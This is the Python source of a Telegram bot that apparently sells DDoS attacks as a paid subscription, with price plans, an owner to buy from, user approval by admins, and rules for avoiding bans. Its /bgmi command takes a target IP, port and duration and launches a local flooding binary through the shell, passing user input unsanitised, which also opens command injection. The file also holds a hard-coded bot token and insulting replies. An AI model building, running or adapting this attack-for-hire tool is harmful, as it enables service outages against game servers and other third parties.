

import telebot
import subprocess
import datetime
import os

from keep_alive import keep_alive
keep_alive()
# insert your Telegram bot token here
bot = telebot.TeleBot('7819992909:AAHn51FAfPId42gmKUT5wPmCoyC4_g9OeN0')

# Admin user IDs
admin_id = ["1662672529"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["1549748318"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: {username}\n𝙏𝙖𝙧𝙜𝙚𝙩: {target}\n𝙋𝙤𝙧𝙩: {port}\n𝙏𝙞𝙢𝙚: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "❌ 𝙡𝙤𝙜𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙚𝙙."
            else:
                file.truncate(0)
                response = "𝙡𝙤𝙜𝙨 𝙘𝙡𝙚𝙖𝙧 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 ✅"
    except FileNotFoundError:
        response = "𝙣𝙤 𝙡𝙤𝙜𝙨 𝙛𝙤𝙪𝙣𝙙 𝙩𝙤 𝙘𝙡𝙚𝙖𝙧."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"🆄︎🆂︎🅴︎🆁︎ 🅸︎🅳︎ : {user_id} | 🆃︎🅸︎🅼︎🅴︎: {datetime.datetime.now()} | 🅲︎🅾︎🅼︎🅼︎🅰︎🅽︎🅳︎: {command}"
    if target:
        log_entry += f" | 🆃︎🅰︎🆁︎🅶︎🅴︎🆃︎: {target}"
    if port:
        log_entry += f" | 🅿︎🅾︎🆁︎🆃︎: {port}"
    if time:
        log_entry += f" | 🆃︎🅸︎🅼︎🅴︎: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "𝙞𝙣𝙫𝙖𝙡𝙞𝙙 𝙙𝙪𝙧𝙖𝙩𝙤𝙞𝙣 𝙛𝙤𝙧𝙢𝙖𝙩 𝙪𝙨𝙚 𝙖 𝙥𝙤𝙨𝙞𝙩𝙞𝙫𝙚 𝙞𝙣𝙩𝙚𝙜𝙚𝙧  'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"🆄︎🆂︎🅴︎🆁︎  {user_to_add} 🅰︎🅳︎🅳︎🅴︎🅳︎ 🆂︎🆄︎🅲︎🅲︎🆄🅴︎🆂︎🆂︎🅵︎🆄︎🅻︎🅻︎🆈︎ {duration} {time_unit}. 🅴︎🆇︎🅿︎🅸︎🆁︎ 🅾︎🅽︎ {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "𝙛𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙨𝙚𝙩 𝙖𝙥𝙥𝙧𝙤𝙫𝙚𝙡 𝙚𝙭𝙥𝙞𝙧𝙮 𝙙𝙖𝙩𝙚."
            else:
                response = "𝙪𝙨𝙚𝙧 𝙖𝙡𝙧𝙚𝙙𝙮 𝙚𝙭𝙞𝙨𝙩 ♥︎."
        else:
            response = "𝙥𝙡𝙚𝙖𝙨𝙚 𝙨𝙥𝙚𝙘𝙞𝙛𝙮 𝙖 𝙪𝙨𝙚𝙧 𝙞𝙙 𝙖𝙣𝙙 𝙙𝙪𝙧𝙖𝙩𝙤𝙞𝙣 (e.g., 1hour, 2days, 3weeks, 4months) 𝙩𝙤 𝙖𝙙𝙙 ✅."
    else:
        response = "❌ 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 𝙩𝙤 𝙤𝙬𝙣𝙚𝙧:- @GODxAloneBOY."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"𝙮𝙤𝙪𝙧 𝙞𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙤𝙣:\n\n🆔 𝙪𝙨𝙚𝙧 : <code>{user_id}</code>\n📝 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚: {username}\n🔖 𝙧𝙤𝙡𝙚: {user_role}\n📅 𝙚𝙭𝙥𝙞𝙧 𝙙𝙖𝙩𝙚: {user_approval_expiry.get(user_id, '𝙣𝙤𝙩 𝙖𝙥𝙥𝙧𝙤𝙫𝙚𝙙')}\n⏳ 𝙧𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 𝙖𝙥𝙥𝙧𝙤𝙫𝙚𝙡 𝙩𝙞𝙢𝙚: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝙪𝙨𝙚𝙧 {user_to_remove} 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮."
            else:
                response = f"𝙪𝙨𝙚𝙧 {user_to_remove} 𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙 𝙞𝙣 𝙩𝙝𝙚 𝙡𝙞𝙨𝙩 ❌."
        else:
            response = '''𝙥𝙡𝙚𝙖𝙨𝙚 𝙨𝙥𝙚𝙘𝙞𝙛𝙮 𝙖 𝙪𝙨𝙚𝙧 𝙞𝙙.
𝙪𝙨𝙖𝙜𝙚: /remove < 𝙪𝙨𝙚𝙧 𝙞𝙙 >'''
    else:
        response = "❌ 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 𝙩𝙤 𝙤𝙬𝙣𝙚𝙧:- @GODxAloneBOY 🙇."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "❌ 𝙡𝙤𝙜𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙚𝙙. 𝙣𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙."
                else:
                    file.truncate(0)
                    response = "𝙡𝙤𝙜𝙨 𝙘𝙡𝙚𝙖𝙧 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 ✅"
        except FileNotFoundError:
            response = "𝙡𝙤𝙜𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙚𝙙 ❌."
    else:
        response = "❌ 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 𝙩𝙤 𝙤𝙬𝙣𝙚𝙧 :- @GODxAloneBOY ❄."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = " ❌ 𝙪𝙨𝙚𝙧𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙚𝙙. 𝙣𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙."
                else:
                    file.truncate(0)
                    response = "𝙪𝙨𝙚𝙧𝙨 𝙘𝙡𝙚𝙖𝙧 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 ✅"
        except FileNotFoundError:
            response = "𝙪𝙨𝙚𝙧𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙚𝙙 ❌."
    else:
        response = "🄿🄷🄸🅁  🄰🄰 🄶🄰🅈🄰  🄻🄰🅄🄳🄴  🄿🄰🄷🄻🄴  🄹🄰  🄾🅆🄽🄴🅁  🅂🄴  🄱🅄🅈  🄺🄰🅁    ---------------🅾︎🆆︎🅽︎🅴︎🆁︎:- @GODxAloneBOY 🙇."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "𝙣𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ❌"
        except FileNotFoundError:
            response = "𝙣𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ❌"
    else:
        response = "🄿🄷🄸🅁  🄰🄰 🄶🄰🅈🄰  🄻🄰🅄🄳🄴  🄿🄰🄷🄻🄴  🄹🄰  🄾🅆🄽🄴🅁  🅂🄴  🄱🅄🅈  🄺🄰🅁    ---------------🅾︎🆆︎🅽︎🅴︎🆁︎:- @GODxAloneBOY ❄."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "🄿🄷🄸🅁  🄰🄰 🄶🄰🅈🄰  🄻🄰🅄🄳🄴  🄿🄰🄷🄻🄴  🄹🄰  🄾🅆🄽🄴🅁  🅂🄴  🄱🅄🅈  🄺🄰🅁    ---------------🅾︎🆆︎🅽︎🅴︎🆁︎:- @GODxAloneBOY ❄."
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f" 🅰︎🆃︎🆃︎🅰︎🅲︎🅺︎ 🅻︎🅰︎🆄︎🅽︎🅲︎🅷︎🅴︎🅳︎\n\n👙 🆃︎🅰︎🆁︎🅶︎🅴︎🆃︎: {target}\n⚙️ 🅿︎🅾︎🆁︎🆃︎: {port}\n⏳ 🆃︎🅸︎🅼︎🅴︎: {time} 🆂︎🅴︎🅲︎🅾︎🅽︎🅳︎🆂︎\n𝙟𝙤𝙞𝙣:- https://t.me/+03wLVBPurPk2NWRl"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 ❌. 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙨𝙚𝙘𝙤𝙣𝙙 𝙖𝙣𝙙 𝙪𝙨𝙚 /bgmi 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙖𝙜𝙖𝙞𝙣."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 150:
                response = "🄴🅁🅁🄾🅁: 🄾🄽🄻🅈 🅄🅂🄴 🅃🄾 149 🅂🄴🄲🄾🄽🄳🅂."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./alone {target} {port} {time} 800"
                process = subprocess.run(full_command, shell=True)
                response = f"🅰︎🆃︎🆃︎🅰︎🅲︎🅺︎ 🅵︎🅸︎🅽︎🅸︎🆂︎🅷︎🅴︎🅳︎: {target} 🅿︎🅾︎🆁︎🆃︎: {port} 🆃︎🅸︎🅼︎🅴︎: {time} 𝙨𝙚𝙣𝙙 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙩𝙤 𝙤𝙬𝙣𝙚𝙧 :-@GODxAloneBOY "
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ 🅄🅂🄰🄶🄴 :- /bgmi <🅃🄰🅁🄶🄴🅃> <🄿🄾🅁🅃> <🅃🄸🄼🄴>"  # Updated command syntax
    else:
        response = ("❌🅐︎🅒︎🅒︎🅔︎🅢︎🅢︎ 🅓︎🅔︎🅝︎🅘︎🅔︎🅓︎\n\n𝙮𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚  /bgmi 𝙘𝙤𝙢𝙢𝙖𝙣𝙙. 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 𝙩𝙤 𝙤𝙬𝙣𝙚𝙧:- @GODxAloneBOY")

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "🚫 𝙣𝙤 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙡𝙤𝙜𝙨 𝙛𝙤𝙪𝙣𝙙."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "𝙮𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 🖕."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🇨 🇴 🇲 🇲 🇦 🇳 🇩 🇸 :
💥 /bgmi : ᵘˢᵉ ᵗʰⁱˢ ᶜᵒᵐᵐᵃⁿᵈ ᶠᵒʳ ˢᵗᵃʳᵗ ᵃᵗᵗᵃᶜᵏ. 
💥 /rules : ᵖˡᵉᵃˢᵉ ᶜʰᵉᶜᵏ ᵇᵉᶠᵒʳᵉ ᵘˢᵉ ᵈᵈᵒˢ.
💥 /mylogs : ᵗᵒ ᶜʰᵉᶜᵏ ʸᵒᵘʳ ʳᵉᶜᵉⁿᵗˢ ᵃᵗᵗᵃᶜᵏ.
💥 /plan : ᶜʰᵉᶜᵏᵒᵘᵗ ᵒᵘʳ ᵈᵈᵒˢ ᵇᵒᵗ ᵖʳⁱᶜᵉ.
💥 /myinfo : ᵗᵒ ᶜʰᵉᶜᵏ ʸᵒᵘ ᵖˡᵃⁿ ⁱⁿᶠᵒʳᵐᵃᵗᵒⁱⁿ.

🇴 🇳 🇱 🇾  🇫 🇴 🇷  🇦 🇩 🇲 🇮 🇳 :
💥 /admincmd : ᵃᵈᵐⁱⁿ ᶜᵒᵐᵐᵃⁿᵈˢ.
Buy From :- @GODxAloneBOY
Official Channel :- https://t.me/+03wLVBPurPk2NWRl
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''▼ 🆆︎🅴︎🅻︎🅲︎🅾︎🅼︎🅴︎ 🆃︎🅾︎ 🅿︎🆁︎🅴︎🅼︎🅸︎🆄︎🅼︎ 🅳︎🅳︎🅾︎🆂︎ ▼,
    
 {user_name}

🅃🅁🅈 🅃🅄 🅃🄷🄸🅂 🄲🄾🄼🄼🄰🄽🄳: /help 
✅🄱🅄🅈 :- @GODxAloneBOY
🄹🄾🄸🄽 :- https://t.me/+03wLVBPurPk2NWRl'''

    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝒑𝒍𝒆𝒂𝒔𝒆 𝒇𝒐𝒍𝒍𝒐𝒘 𝒕𝒉𝒆 𝒓𝒖𝒍𝒆𝒔 ⚠️:

1. 𝒅𝒐𝒏'𝒕 𝒓𝒖𝒏 𝒕𝒐𝒐 𝒎𝒂𝒏𝒚 𝒂𝒕𝒕𝒂𝒄𝒌 𝒕𝒐 𝒔𝒆𝒎 𝒊𝒑 𝒑𝒐𝒓𝒕 !! 𝒄𝒂𝒖𝒔𝒆 𝒂 𝒃𝒂𝒏 𝒂 𝒃𝒐𝒕.
2. 𝒅𝒐𝒏'𝒕 𝒓𝒖𝒏 2 𝒂𝒕𝒕𝒂𝒄𝒌𝒔 𝒂𝒕 𝒔𝒂𝒎𝒆 𝒕𝒊𝒎𝒆 𝒃𝒆𝒄𝒛 𝒊𝒇 𝒖 𝒈𝒐𝒕 𝒃𝒂𝒏𝒏𝒆𝒅 𝒇𝒓𝒐𝒎 𝒃𝒐𝒕.
3. 𝒘𝒆 𝒅𝒂𝒊𝒍𝒚 𝒄𝒉𝒆𝒄𝒌𝒔 𝒕𝒉𝒆 𝒍𝒐𝒈𝒔 𝒔𝒐 𝒇𝒐𝒍𝒍𝒐𝒘 𝒕𝒉𝒆𝒔𝒆 𝒓𝒖𝒍𝒆𝒔 𝒕𝒐 𝒂𝒗𝒐𝒊𝒅 𝒃𝒂𝒏.
4. 𝒕𝒐 𝒎𝒂𝒌𝒆 𝒔𝒖𝒓𝒆 𝒚𝒐𝒖 𝒂𝒓𝒆 𝒋𝒐𝒊𝒏 𝒄𝒉𝒂𝒏𝒏𝒆𝒍:- https://t.me/+03wLVBPurPk2NWRl '''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name},𝒃𝒓𝒐𝒕𝒉𝒆𝒓 𝒐𝒏𝒍𝒚 1 𝒑𝒍𝒂𝒏𝒔 𝒊𝒔𝒑𝒐𝒘𝒆𝒓𝒇𝒖𝒍𝒍 𝒕𝒉𝒆𝒏 𝒂𝒏𝒚 𝒐𝒕𝒉𝒆𝒓𝒔 𝒅𝒅𝒐𝒔.

🅅🄸🄿 🄳🄳🄾🅂 :
-> 𝒂𝒕𝒕𝒂𝒄𝒌 𝒕𝒊𝒎𝒆 : 300 (S)
-> 𝒂𝒇𝒕𝒆𝒓 𝒂𝒕𝒕𝒂𝒄𝒌 𝒍𝒊𝒎𝒊𝒕 : 10 sec
-> 𝒄𝒐𝒏𝒄𝒖𝒓𝒓𝒆𝒏𝒕𝒔 𝒂𝒕𝒕𝒂𝒄𝒌 : 5

🄿🅁🄸🄲🄴 🄻🄸🅂🅃 :
𝒅𝒂𝒚  ->80 Rs
𝒘𝒆𝒆𝒌 ->400 Rs
𝒎𝒐𝒏𝒕𝒉 ->1000 Rs
𝒅𝒎 𝒕𝒐 𝒑𝒖𝒓𝒄𝒉𝒆𝒔 𝒐𝒘𝒏𝒆𝒓 :- @GODxAloneBOY'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : 𝒂𝒅𝒅 𝒂 𝒖𝒔𝒆𝒓.
💥 /remove <userid> 𝒓𝒆𝒎𝒐𝒗𝒆𝒂 𝒖𝒔𝒆𝒓.
💥 /allusers :  𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒖𝒔𝒆𝒓 𝒍𝒊𝒔𝒕.
💥 /logs :      𝒂𝒍𝒍 𝒖𝒔𝒆𝒓 𝒍𝒐𝒈𝒔.
💥 /broadcast : 𝒃𝒓𝒐𝒅𝒄𝒂𝒔𝒕 𝒎𝒆𝒔𝒔𝒂𝒈𝒆 𝒂𝒍𝒍 𝒖𝒔𝒆𝒓.
💥 /clearlogs : 𝒄𝒍𝒆𝒂𝒓 𝒕𝒉𝒆 𝒍𝒐𝒈𝒔 .
💥 /clearusers : 𝒄𝒍𝒆𝒂𝒓 𝒕𝒉𝒆 𝒖𝒔𝒆𝒓𝒔 𝒇𝒊𝒍𝒆.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = " 𝙗𝙧𝙤𝙙𝙘𝙖𝙨𝙩 𝙢𝙚𝙨𝙖𝙖𝙜𝙚 𝙨𝙚𝙣𝙩 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙩𝙤 𝙖𝙡𝙡 𝙪𝙨𝙚𝙧👍."
        else:
            response = "🤖 𝙥𝙡𝙚𝙖𝙨𝙚 𝙥𝙧𝙤𝙫𝙞𝙙 𝙖 𝙗𝙧𝙤𝙙𝙘𝙖𝙨𝙩 𝙢𝙚𝙖𝙨𝙨𝙖𝙜𝙚."
    else:
        response = "𝙮𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 🖕."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


